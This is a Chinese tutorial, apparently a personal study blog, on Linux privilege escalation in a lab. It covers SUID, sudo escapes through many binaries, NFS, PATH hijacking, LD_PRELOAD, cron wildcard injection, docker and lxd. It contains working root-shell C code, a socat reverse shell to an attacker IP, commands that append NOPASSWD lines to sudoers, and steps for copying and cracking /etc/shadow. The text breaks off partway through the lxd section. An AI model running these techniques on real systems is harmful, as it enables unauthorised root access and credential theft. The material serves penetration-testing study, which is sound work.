<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021644931.png" alt="image-20231002164422861"></p>
<p>当vim被赋予SUID权限后，意味着如何用户都可以使用vim命令来编辑那些只能由root用户编辑的文件，例如通过vim来编辑&#x2F;etc&#x2F;sudoers文件（普通用户直接访问会被拒绝），在sudoers文件中配置普通用户的权限，权限和root一样，这里以kali用户为例，添加如下内容：</p>
<p>kali ALL&#x3D;(ALL:ALL) ALL</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021644035.png" alt="image-20231002164458991"></p>
<p>vim编辑后保存时用**wq!**强制保存，vim运行时虽然是root权限，但wq依然会提示只读</p>
<p>随后sudo bash 就会获取一个root的shell</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021645465.png" alt="image-20231002164513409"></p>
<p><strong>脚本</strong></p>
<p>除了系统的一些可执行命令，自己写的可执行文件可以以添加SUID权限</p>
<p>c语言示例代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;unistd.h&gt;</span><br><span class="line">#include&lt;sys/types.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    setuid(geteuid());</span><br><span class="line">    system(&quot;/bin/bash&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用gcc编译</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021645594.png" alt="image-20231002164551552"></p>
<p>编译后传入靶机，放在桌面，然后添加SUID权限进行测试</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021646744.png" alt="image-20231002164600690"></p>
<p>普通用户执行该文件，会返回一个root权限的shell</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021646597.png" alt="image-20231002164614560"></p>
<p><strong>总结</strong></p>
<p>有很多命令在被添加SUID权限的情况下，都可以用来进行提权</p>
<p>更多命令和用法可以参考：<a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p>
<p><strong>利用sudo进行提权</strong></p>
<p><strong>sudo和su的区别</strong></p>
<p>1，sudo是以root权限去运行一个命令，su是去切换用户的身份。</p>
<p>2，sudo只要知道自己的密码即可，su需要知道被切换用户的密码。</p>
<p><strong>sudoers文件</strong></p>
<p>&#x2F;etc&#x2F;sudoers文件，是sudo权限的配置文件。当使用sudo接命令时，linux系统会在sudoers文件中查找当前用户，根据当前用户权限配置来决定是否可以运行相关命令。</p>
<p>例如添加kali用户的相关配置：</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021647748.png" alt="image-20231002164705713"></p>
<p>格式如下：</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021647565.png" alt="image-20231002164755520"></p>
<p><strong>sudo su &amp;&amp; sudo bash</strong></p>
<p>当没有对普通用户做严格的限制时，或者配置权限过大时，则可以尝试sudo su来切换到root权限。</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021648799.png" alt="image-20231002164807747"></p>
<p>或者执行sudo bash</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021648380.png" alt="image-20231002164830340"></p>
<p>当visudo命令不能用时，限制了部分命令，则可以尝试下vim是否被禁用，sudo vim也可以编辑</p>
<p>sudoers文件，且wq!可以成功保存。</p>
<p>（<strong>visudo</strong>命令编辑sudo命令使用的<strong>sudoers</strong>文件）</p>
<p><strong>git</strong></p>
<p>当sudo允许执行git命令时，可以利用git提权</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo git help config</span><br><span class="line">!/bin/bash</span><br><span class="line"></span><br><span class="line">sudo git -p help</span><br><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure>

<p><strong>其他命令</strong></p>
<p>也有很多其他命令可以用来提权，和之前的SUID提权中说的命令类似，例如sudo允许find命令，则可以</p>
<p>通过exec参数来切换到root权限。</p>
<p>使用visudo（自动检查语法错误），这里添加新用户aaa（adduser aaa），并修改sudoers文件，允许部分命令，内容如下。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaa ALL=(ALL:ALL) /usr/bin/find,/usr/bin/perl,/usr/bin/python3,/usr/bin/less,/usr/bin/awk,/usr/bin/man,/usr/bin/vi</span><br></pre></td></tr></table></figure>

<p>这时aaa用户使用sudo就只能执行配置好的命令，sudo su和sudo bash被禁止执行。</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021648338.png" alt="image-20231002164844274"></p>
<p>相关命令提权方式如下：</p>
<p><strong>find</strong>：exec参数用来指定搜索结果的处理命令，需要以分号结尾，分号在命令行有特殊函数，要用\进行转义。</p>
<p><strong>perl</strong>：e参数用来指定要运行的命令，然后使用linux的exec参数来调用bash。</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021648513.png" alt="image-20231002164858472"></p>
<p><strong>python</strong>：c参数可以在命令行执行python代码，pty库是一个伪终端库，它的spawn会调用指定的程序。</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021649990.png" alt="image-20231002164916950"></p>
<p><strong>less</strong>：输入sudo less &#x2F;etc&#x2F;hosts（这里可以是其他文件）命令浏览文件内容时，到底部输入!bash后回车，会获得一个root权限的shell。</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021649568.png" alt="image-20231002164926527"></p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021649472.png" alt="image-20231002164936434"></p>
<p><strong>awk</strong>：通过调用linux的system函数来打开bash。</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021649322.png" alt="image-20231002164951271"></p>
<p><strong>man</strong>：通过sudo man man命令来打开man的使用手册，同时会进入编辑行，输入!bash回车，可获取root权限。</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021650482.png" alt="image-20231002165002437"></p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021650294.png" alt="image-20231002165015256"></p>
<p><strong>vi</strong>：sudo vi会进入vi默认页，输入:!bash回车，可进入root命令行。</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021650682.png" alt="image-20231002165029622"></p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021651584.png" alt="image-20231002165136544"></p>
<p>脚本：如果sudoers定义了可以执行某个脚本，则我们可以把返回shell的代码添加进去。</p>
<p>例如桌面有个运维需要的aaa.sh文件，我们添加一段打开bash的代码，然后sudo运行即可。</p>
<p>参考代码：</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021652817.png" alt="image-20231002165214773"></p>
<p><strong>应用程序</strong></p>
<p>除了上面的一些二进制文件，一些应用程序也可以获取root权限，例如env、ftp、socat、scp。</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021652927.png" alt="image-20231002165226882"></p>
<p>env(<strong>Linux</strong>系统里的env命令可以显示当前用户的环境变量，还可以用来在指定环境变量下执行其他命令)：</p>
<p>通过env环境变量来获取root权限。</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021653695.png" alt="image-20231002165331654"></p>
<p>ftp：通过ftp来进入bash获取root权限。</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021653912.png" alt="image-20231002165342870"></p>
<p>socat(nc加强版)：通过socat客户端连接攻击机，攻击机可获得rootshell。先执行服务端，后执行客户端。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#客户端执行</span><br><span class="line">sudo socat exec:&#x27;sh -li&#x27;,pty,stderr,setsid,sigint,sane tcp:192.168.23.128:4444</span><br><span class="line">#攻击机执行</span><br><span class="line">socat file:`tty`,raw,echo=0 tcp-listen:4444</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021654136.png" alt="image-20231002165406093"></p>
<p>还有一个scp，scp是一个安全复制文件的命令，它无法获取一个shell，但可以用来复制一些系统的敏感</p>
<p>文件。例如etc&#x2F;passwd、etc&#x2F;shadow等。</p>
<p>如下命令，将passwd文件传输到指定机器的root&#x2F;Desktop下，然后再对密码进行破解等操作。（需要开启攻击机的ssh服务）</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021654747.png" alt="image-20231002165416704"></p>
<p>（配合john爆破etc&#x2F;shadow中的密码）</p>
<p><strong>黑名单情况</strong></p>
<p>如果碰到sudoers文件使用黑名单的情况，比如说权限禁用sudo使用find命令，但是都是在ALL基础上设置的，那么可以cp把find复制到其它目录运行。</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021654181.png" alt="image-20231002165456122"></p>
<p><strong>NFS配置不当导致提权</strong></p>
<p>NFS是network file system缩写，网络文件系统，用来挂在某个目录或文件进行共享，默认是2049端口，功能类似于windows的共享</p>
<p>简单配置一下：</p>
<p>首先安装nfs服务端：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install nfs-kernel-server</span><br></pre></td></tr></table></figure>

<p>安装后修改配置文件&#x2F;etc&#x2F;exports，这里将home目录进行挂载共享，内容如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/home *(rw,no_root_squash)</span><br></pre></td></tr></table></figure>

<p>其中&#x2F;home是要挂载的目录，*代表允许连接的主机，这里是所有，rw是读写权限，no_root_squash代表客户端允许以root权限访问nfs。</p>
<p>随后重启相关服务：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># nfs通过rpc通信，这里把rpcbind也重启下</span><br><span class="line">sudo /etc/init.d/rpcbind restart</span><br><span class="line">sudo /etc/init.d/nfs-kernel-server restart</span><br></pre></td></tr></table></figure>

<p>此时就配置好了，可以通过showmount命令来列出目标机的共享目录，e参数显示NFS服务器的输出清单。</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021655543.png" alt="image-20231002165507497"></p>
<p>或者通过nmap的相关脚本来进行扫描。</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021655509.png" alt="image-20231002165521449"></p>
<p><strong>NFS****配置不当可提权</strong></p>
<p>当nfs配置了读写权限，且允许客户端以root访问时，就会存在安全隐患。测试如下：</p>
<p>首先客户端把目标机nfs的共享挂载到本地，然后把bash复制进去并赋予suid权限，操作如下图</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021655094.png" alt="image-20231002165533023"></p>
<p>此时目标机的home目录下就会有一个具有suid权限的bash。</p>
<p>普通用户执行即可获取root权限，这里注意需要加上p参数，否则权限还是当前用户的。</p>
<p>p参数说明：不提供的情况下，打开bash权限是当前实际用户，提供的情况下，会打开特权模式，像上继承euid，因为bash有suid权限，所以这里是root。</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021655261.png" alt="image-20231002165545218"></p>
<p>使用场景：这个和suid提权很像，给程序赋予suid权限然后利用。不同的是前两篇suid提权是当前用户使用sudo chmod自己修改的，在sudoers禁用sudo命令等情况下，就行不通了。而nfs配置利用，是客户端挂载到本地赋权的，目标机的普通用户只需执行就可以。</p>
<p>同理，之前总结的suid提权的那些程序也同样适用，这里就不再记了。</p>
<p><strong>其它命令</strong></p>
<p>除了可以直接得到shell的，还有其他一些程序不能直接获取，例如nano、vi等。</p>
<p>例如nano被共享了，则可以给nano一个suid权限，然后来读取敏感文件，爆破密码从而登录。</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021655831.png" alt="image-20231002165556759"></p>
<p>然后使用nano -p来读取shadow文件，这里读取时把相关记录复制出来，使用john破解，测试不能重定向，需要权限，所以只能复制。</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021656644.png" alt="image-20231002165607584"></p>
<p>复制后使用john破解获取相关用户密码，以aaa为例，密码是aaa。</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021656521.png" alt="image-20231002165649474"></p>
<p>(再次破解相同用户，需要加 –show 参数)</p>
<p>如果密码太复杂，破解不了，则可以尝试其它用户</p>
<p>这时候不确定aaa是否为root权限，则可以继续使用nano去编辑passwd文件(.&#x2F;nano &#x2F;etc&#x2F;passwd)，给aaa赋权。</p>
<p>把原来的1001换成0</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021657208.png" alt="image-20231002165700163"></p>
<p>然后切换aaa用户即可。</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021657300.png" alt="image-20231002165739260"></p>
<p>利用这种机制，也可以用来修改sudoers文件，添加或修改为以下内容。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaa ALL=(ALL:ALL) NOPASSWD:ALL</span><br></pre></td></tr></table></figure>

<p>然后使用sudo bash或sudo su获取root权限</p>
<p><strong>使用PATH变量进行提权</strong></p>
<p>Linux中的PATH是一个环境变量，它指定了可执行程序所在的目录，例如bin和sbin目录，当我们在终端运行一个命令时，系统就会根据PATH来查找相关的可执行文件。</p>
<p>可以执行env命令列出所有的环境变量，然后找到PATH，或者grep进行结果筛选，或者echo出$PATH值，命令如下。</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021657150.png" alt="image-20231002165758111"></p>
<p><strong>ps结合PATH提权</strong></p>
<p>首先编译以下c代码，功能为调用ps命令。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;unistd.h&gt;</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">    setuid(0);</span><br><span class="line">    setgid(0);</span><br><span class="line">    system(&quot;ps&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021658904.png" alt="image-20231002165818860"></p>
<p>随后以root身份赋予777权限，然后再赋予一个suid权限。</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021658617.png" alt="image-20231002165829570"></p>
<p>此时普通用户执行这个shell文件，可以看到就是执行的ps命令。</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021658376.png" alt="image-20231002165841327"></p>
<p><strong>利用</strong>：到tmp目录下，把bash写到一个ps文件中，然后修改PATH变量添加tmp目录，再去执行shell，就会获得一个root权限。</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021658432.png" alt="image-20231002165853385"></p>
<p>过程：root给一个可执行文件赋予了suid，而此文件又调用了ps命令，这时修改PATH把tmp添加到头的位置，系统再执行就会先去tmp目录下找，tmp目录下放的是恶意程序，从而导致恶意程序以root权限运行。</p>
<p>情况：这种情况适用于，给普通用户分配了个可执行程序，且该程序有suid权限，我们又知道该程序会调用哪些命令，那么就可以结合PATH来进行提权。</p>
<p><strong>cp结合PATH提权</strong></p>
<p>除了把bash写到ps文件中以外，还可以把类似于sh的可执行程序复制过来。</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021659630.png" alt="image-20231002165916588"></p>
<p><strong>符号连接结合PATH提权</strong></p>
<p>还可以通过ln命令来设置一个连接，连接到sh，但条件是当前可执行程序所在目录要有相关权限，我这里就直接sudo创建了。</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021659522.png" alt="image-20231002165932468"></p>
<p>如果在tmp下创建连接，这里测试并不会调用</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021700381.png" alt="image-20231002170007338"></p>
<p><strong>总结</strong></p>
<p>上面以ps为例，其它命令都可以，例如id、whoami、cat、vim等等，方法都一样，只是改下tmp目录下的文件名。</p>
<p><strong>使用LD_PRELOAD进行提权</strong></p>
<p>LD_PRELOAD是Linux下的一个环境变量，程序运行时都会加载一些so文件，类似于windows下程序加载dll，而LD_PRELOAD可以指定程序运行前加载的动态连接库。</p>
<p>测试前先按如下配置一下sudoers文件，以aaa用户为例，添加一个find命令和一个LD_PRELOAD。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aaa ALL=(ALL:ALL) NOPASSWD:/usr/bin/find</span><br><span class="line">Defaults env_keep += LD_PRELOAD</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021700081.png" alt="image-20231002170035032"></p>
<p>配置用户sudo权限之前有记录过，这里记录下env_keep的说明。</p>
<p>例如aaa用户有一个aaa的环境变量，当通过su切换到bbb用户时，再查看env环境变量，aaa就没有了，也就意味着用户的切换不会带着环境变量一块切过去。而想保持某个环境不受用户切换的影响，那么可以在sudoers文件中设置env_keep。</p>
<p><strong>提权测试</strong></p>
<p>切换回普通用户，查看sudo权限。</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021701537.png" alt="image-20231002170124491"></p>
<p>我们有一个find的sudo权，且env_keep中定义了LD_PRELOAD，那么我们就可以定义一个恶意的so文件，然后sudo运行find时指定LD_PRELOAD来加载我们自己的so文件，就可以实现提权</p>
<p>so文件的c代码如下:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">void _init()</span><br><span class="line">&#123;</span><br><span class="line">    unsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class="line">    setgid(0);</span><br><span class="line">    setuid(0);</span><br><span class="line">    system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后进行编译-fPIC -shared参数简单理解就是动态编辑共享库，可以进行公共调用，nostartfiles参数代表该库运行不会去调用系统的其它库，避免影响自己的程序执行。</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021702470.png" alt="image-20231002170217426"></p>
<p>编译后我们使用sudo运行find并指定LD_PRELOAD为我们编译的shell.so文件，这时find就会先调用shell.so，导致我们的代码被执行，返回的权限为root。</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021702260.png" alt="image-20231002170237213"></p>
<p>注意点：如果使用自己攻击机编译的so文件，传到目标机可能普通用户没有执行权限，这时需要加下权限。如果目标机支持gcc编译，也可以直接在目标机编译。</p>
<p><strong>总结</strong></p>
<p>使用情况就是sudoers中的env_keep定义了LD_PRELOAD，然后sudo有相关的命令，那么sudo运行命令时就可以通过LD_PRELOAD来指定恶意so文件。</p>
<p><strong>利用Cron进行提权</strong></p>
<p>cronjobs是定时任务，在特定的日期和时间执行计划任务。例如定期备份或者定期清理某个目录等都会用到，定义格式如下：</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021703832.png" alt="image-20231002170300781"></p>
<p><strong>crontab文件覆盖</strong></p>
<p>这里以root用户创建一下测试环境，首先创建一个cron，运行一个脚本，该脚本功能是定时清除特定目录，例如&#x2F;tmp&#x2F;filetest。</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021703510.png" alt="image-20231002170343455"></p>
<p>这里写一个py脚本，并添加执行权限（chmod 777 clear.py）</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021704946.png" alt="image-20231002170401888"></p>
<p>然后添加定时任务。</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021704297.png" alt="image-20231002170422230"></p>
<p>这时每隔两分钟，clear脚本就会被执行一次。</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021704045.png" alt="image-20231002170447982"></p>
<p>提权方法就是替换clear脚本的内容，我们可以往脚本添加相关的命令，即把&#x2F;bin&#x2F;dash设置为suid权限即可</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021705474.png" alt="image-20231002170512410"></p>
<p>dash相比bash要小，运行速度更快，如果是脚本调用，可以使用dash。随后可以看到dash具有suid权限，运行然后添加p参数来继承上级权限。</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021705264.png" alt="image-20231002170529203"></p>
<p>除此外，也可以添加修改sudoers或者添加etc&#x2F;passwd的命令等等。</p>
<p><strong>通配符介绍</strong></p>
<p>linux中有很多通配符，和正则类似，例如tar一个目录，如果写 * ，就代表压缩当前目录下的所有文件，* 代表一个或多个字符。</p>
<p>在操作过程中，如果有文件名的名字是一个参数，那么执行过程中，就会被当作参数运行。例如一个目录下有一个叫–help的文件，当cat查看该文件内容时，实际上确是cat的帮助信息。</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021706130.png" alt="image-20231002170602067"></p>
<p><strong>crontab通配符注入</strong></p>
<p>常见的定时任务除了定时清除文件外，定时压缩也会很常见，例如有一个定时任务，每分钟回去执行&#x2F;var&#x2F;www&#x2F;html&#x2F;cron.sh脚本，该脚本是备份html网站，脚本内容如下，记得修改权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">cd /var/www/html/</span><br><span class="line">tar cf /var/backups/html.tar *</span><br></pre></td></tr></table></figure>

<p>添加定时任务，每分钟执行一次</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021706203.png" alt="image-20231002170625165"></p>
<p>此时可以验证下，定时任务已经生效</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021707873.png" alt="image-20231002170706823"></p>
<p>在tar命令中有一个checkpoint参数，即检查点，比如checkpoint&#x3D;1，则代表压缩过程中每压缩一个文件就去执行一个检查操作。</p>
<p>而这个检查操作的参数是**–checkpoint-action&#x3D;exec&#x3D;**，后面可以跟要执行的命令。</p>
<p>利用思路就是我们写入一个sh脚本，该脚本作用是修改sudoers文件，把当前用户添加进去，获得sudo所有权，从而进行提权。然后利用checkpoint-action&#x3D;exec&#x3D;接一个执行sh脚本的命令即可。</p>
<p>利用过程：首先创建两个文件，名字为参数名，然后再创建一个sh脚本，内容为向sudoers追加权限，相关命令如下：先cd到&#x2F;var&#x2F;www&#x2F;html目录下，然后</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;echo &quot;aaa ALL=(root) NOPASSWD: ALL&quot; &gt;&gt; /etc/sudoers&#x27; &gt; test.sh</span><br><span class="line">echo &quot;&quot; &gt; --checkpoint=1</span><br><span class="line">echo &quot;&quot; &gt; &quot;--checkpoint-action=exec=sh test.sh&quot;</span><br></pre></td></tr></table></figure>

<p>等待一分钟后，sudoers就会被追加aaa用户的权限，然后就可以使用sudo bash来提权</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021707719.png" alt="image-20231002170723667"></p>
<p>这里查看当前用户的sudo权限也可以发现，每分钟sudoers就会被追加一行。</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021707145.png" alt="image-20231002170746091"></p>
<p><strong>利用Docker进行提权</strong></p>
<p>在docker中，是允许访问root用户和docker组中的其它用户的，测试如下。</p>
<p>首先以root身份把一个普通账号添加到docker组，这里是aaa用户。然后使用newgrp将root账号初始组切换为docker。</p>
<p>usermod命令用来修改指定用户的属组，G参数指定要添加的组名称。</p>
<p>newgrp命令切换默认属组。</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021708726.png" alt="image-20231002170815680"></p>
<p>然后切换到aaa，可以看到当前已在docker组。</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021708515.png" alt="image-20231002170832471"></p>
<p>随后使用docker run来允许alpine镜像（小型Linux系统），v参数进行挂载，是将宿主机的root目录挂载到alpine的mnt下，使用冒号分隔。i参数是保持打开状态，t参数是分配一个tty终端，it一般结合使用，即保持通讯终端的打开。</p>
<p>这时访问docker镜像alpine，就相当于访问宿主机的root目录，权限变成了root。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -v /root:/mnt -it alpine</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021709892.png" alt="image-20231002170900822"></p>
<p>利用方式还有很多，例如将宿主机的etc挂载过来，然后查看shadow文件，进行密码破解。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -v /etc/:/mnt -it alpine</span><br></pre></td></tr></table></figure>

<p>或者添加root身份的账号到passwd文件中</p>
<p><strong>总结</strong>如果一个普通用户在docker组，且root账号的默认组是docker，那么这个普通用户就可以利用alpine镜像来讲宿主机的指定目录挂载到虚拟机中，从而来访问root目录、etc目录等敏感文件来进行提权。</p>
<p><strong>利用Lxd进行权限提升</strong></p>
<p>三个概念就是lxd、lxc和docker。</p>
<p>lxc：是一个系统容器，使进程之间相互隔离，进程虚拟化。</p>
<p>lxd：lxc有些缺点，例如不能进行容器迁移，管理比较复杂等，所以进行了升级，即lxd，用来管理容器。</p>
<p>docker：lxc和lxd都是系统容器，而docker是应用程序容器。</p>
<p><strong>总结</strong>：lxc是系统容器。lxd是守护程序，来管理lxc的所有容器。docker是应用程序容器。</p>
<p><strong>环境搭建</strong></p>
<p>以ubuntu为例，首先以root命令安装lxd、lxc、lxc-templates。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install lxd lxc lxc-templates</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">snap install lxd</span><br><span class="line">apt install lxc</span><br><span class="line">apt install lxc-templates</span><br></pre></td></tr></table></figure>

<p>然后为lxd安装依赖</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install zfsutils-linux</span><br></pre></td></tr></table></figure>

<p>zfs是一个文件系统类型，具体说明可参考如下链接</p>
<p><a target="_blank" rel="noopener" href="https://blog.dustinkirkland.com/2016/02/zfs-is-fs-for-containers-in-ubuntu-1604.html">https://blog.dustinkirkland.com/2016/02/zfs-is-fs-for-containers-in-ubuntu-1604.html</a></p>
<p>这里测试aaa账户，把aaa添加到 lxd组</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021709579.png" alt="image-20231002170928534"></p>
<p>随后使用lxd命令进行lxd初始化，在初始化过程中，对于存储选项默认是zfs，这里改成dir，其它默认即可，如下图。</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021709699.png" alt="image-20231002170948639"></p>
<p>lxd初始化后，就可以进行容器部署了。</p>
<p>这里先使用lxc来启动一个容器，会现在本地找，本地没有会去下载部署然后启动</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021711925.png" alt="image-20231002171101874"></p>
<p>容器部署启动后，就可以通过lxc list命令来查看已经启动的容器。</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021711697.png" alt="image-20231002171116650"></p>
<p>这时环境就可以了</p>
<p><strong>攻击机设置</strong></p>
<p>这里攻击机以kali为例，首先需要下载alpine，然后进行build构建，命令如下图</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021711025.png" alt="image-20231002171128953"></p>
<p>此时就会生成一个tar.gz包，把该包传到目标机的tmp下</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021711198.png" alt="image-20231002171153128"></p>
<p>导入tmp后，我们把该映像添加到lxd中，添加后可通过lxc image list查看</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021712359.png" alt="image-20231002171238297"></p>
<p>随后进行提权操作，相关命令和说明如下：</p>
